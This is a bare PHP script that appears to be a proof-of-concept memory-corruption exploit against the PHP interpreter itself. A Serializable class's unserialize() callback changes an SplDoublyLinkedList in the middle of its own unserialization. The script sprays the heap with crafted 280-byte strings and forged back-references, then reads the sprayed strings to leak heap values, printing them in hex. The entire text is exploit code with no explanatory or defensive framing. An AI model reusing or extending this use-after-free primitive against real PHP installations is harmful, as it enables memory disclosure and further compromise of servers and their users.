<?php
class CachedData implements Serializable {
    public function serialize(): string { return ''; }
    public function unserialize(string $data): void {
        global $carrier;
        $carrier[0]->x = 0;
    }
}

function put_u32(string &$s, int $off, int $v): void {
    for ($i = 0; $i < 4; $i++) {
        $s[$off + $i] = chr(($v >> ($i * 8)) & 0xff);
    }
}

function get_u64(string $s, int $off): int {
    $v = 0;
    for ($i = 7; $i >= 0; $i--) {
        $v = ($v << 8) | ord($s[$off + $i]);
    }
    return $v;
}

function make_spray(): string {
    $s = str_repeat("B", 280);
    for ($k = 0; $k < 8; $k++) {
        $off = 0x28 + $k * 0x20;
        put_u32($s, $off, 0xbbbb0000 + $k);
        put_u32($s, $off + 8, 4);
    }
    return $s;
}

$victim = 'O:8:"stdClass":8:{';
for ($k = 0; $k < 8; $k++) {
    $victim .= 's:2:"p' . $k . '";i:' . (0xaaaa0000 + $k) . ';';
}
$victim .= '}';

$spray = make_spray();
$payload = 'i:0;:' . $victim . ':C:10:"CachedData":0:{}';
for ($i = 0; $i < 32; $i++) {
    $payload .= ':s:280:"' . $spray . '";';
}
for ($i = 3; $i <= 10; $i++) {
    $payload .= ':R:' . $i . ';';
}

$carrier = new SplDoublyLinkedList();
$carrier->unserialize($payload);
for ($i = 2; $i < 34; $i++) {
    $s = $carrier[$i];
    for ($k = 0; $k < 8; $k++) {
        $off = 0x28 + $k * 0x20;
        if (get_u64($s, $off) !== 0x00000000bbbb0000 + $k) {
            echo dechex(get_u64($s, $off)), "\n";
            exit;
        }
    }
}
echo "NO_LEAK\n";
